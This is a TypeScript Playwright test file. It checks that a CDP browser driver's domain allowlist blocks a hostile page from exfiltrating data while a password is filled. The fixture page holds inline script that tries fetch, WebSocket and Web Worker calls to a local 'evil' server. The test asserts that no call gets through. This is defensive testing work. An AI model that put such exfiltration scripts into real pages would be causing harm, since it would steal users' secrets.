import { spawn } from "node:child_process";
import { mkdtemp, rm } from "node:fs/promises";
import { type Server, createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { expect, test } from "@playwright/test";
import { z } from "zod";
import { CdpBrowserDriver } from "../src/cdp-driver.js";
import { connectCdp } from "../src/cdp-node-socket.js";

const CHROME = process.env.PLAYWRIGHT_CHROMIUM ?? "/usr/bin/google-chrome";
const versionSchema = z.object({ webSocketDebuggerUrl: z.string() });
const addressSchema = z.object({ port: z.number() });

function listen(server: Server): Promise<number> {
  return new Promise((resolve) => {
    server.listen(0, "127.0.0.1", () => {
      resolve(addressSchema.parse(server.address()).port);
    });
  });
}

test("CDP boundary blocks page, WebSocket, and worker exfiltration in a real browser", async () => {
  let evilHits = 0;
  const evil = createServer((_request, response) => {
    evilHits += 1;
    response.end("stolen");
  });
  const evilPort = await listen(evil);
  const site = createServer((_request, response) => {
    response.setHeader("content-type", "text/html");
    response.end(`<html><body>
      <input type="password" name="new_password">
      <script>
        fetch("http://localhost:${evilPort}/fetch").catch(() => {});
        try { new WebSocket("ws://localhost:${evilPort}/socket"); } catch {}
        try {
          const worker = new Worker(URL.createObjectURL(new Blob([
            "fetch('http://localhost:${evilPort}/worker').catch(()=>{})",
          ], { type: "text/javascript" })));
        } catch {}
        fetch("/same-host").catch(() => {});
      </script></body></html>`);
  });
  const sitePort = await listen(site);
  const profile = await mkdtemp(join(tmpdir(), "os-cdp-boundary-"));
  const chrome = spawn(CHROME, [
    "--headless=new",
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--remote-debugging-port=19223",
    `--user-data-dir=${profile}`,
    "about:blank",
  ]);
  try {
    let webSocketUrl = "";
    for (let attempt = 0; attempt < 100 && !webSocketUrl; attempt++) {
      try {
        const response = await fetch("http://127.0.0.1:19223/json/version");
        if (response.ok)
          webSocketUrl = versionSchema.parse(
            await response.json(),
          ).webSocketDebuggerUrl;
      } catch {
        // Chromium is still starting.
      }
      if (!webSocketUrl)
        await new Promise((resolve) => setTimeout(resolve, 200));
    }
    expect(webSocketUrl).not.toBe("");
    const connection = await connectCdp(webSocketUrl);
    const driver = await CdpBrowserDriver.connect(connection, {
      allowedDomains: ["127.0.0.1"],
    });
    await driver.open(`http://127.0.0.1:${sitePort}/reset`);
    const observation = await driver.snapshot();
    const password = observation.fields.find(
      (field) => field.kind === "password",
    );
    expect(password).toBeDefined();
    await driver.fillSecret(password?.ref ?? "e1", "probe-secret-123");
    await new Promise((resolve) => setTimeout(resolve, 2000));
    expect(evilHits).toBe(0);
    await driver.close();
  } finally {
    if (chrome.exitCode === null) {
      const exited = new Promise<void>((resolve) =>
        chrome.once("exit", () => resolve()),
      );
      chrome.kill("SIGKILL");
      await exited;
    }
    site.close();
    evil.close();
    await rm(profile, {
      recursive: true,
      force: true,
      maxRetries: 5,
      retryDelay: 200,
    });
  }
});
